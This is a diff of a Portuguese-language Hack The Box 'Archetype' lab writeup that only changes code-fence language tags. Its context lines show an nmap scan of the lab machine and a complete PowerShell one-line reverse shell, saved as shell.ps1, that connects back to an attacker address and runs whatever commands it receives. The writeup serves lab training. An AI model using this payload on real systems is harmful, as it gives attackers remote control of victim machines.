@@ -25,7 +25,7 @@ alt: "HTB Archetype Writeup"
 ## RECON
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Archetype]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.10.27 --min-rate=512
 PORT      STATE SERVICE      VERSION
@@ -141,7 +141,7 @@ Vamos seguir os passos da documentação e testar algum comando.
 
 Primeiro vamos criar um payload de uma linha em power shell e salvá-lo no arquivo `shell.ps1`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/Archetype]
 └─$ cat shell.ps1
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.251",8443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
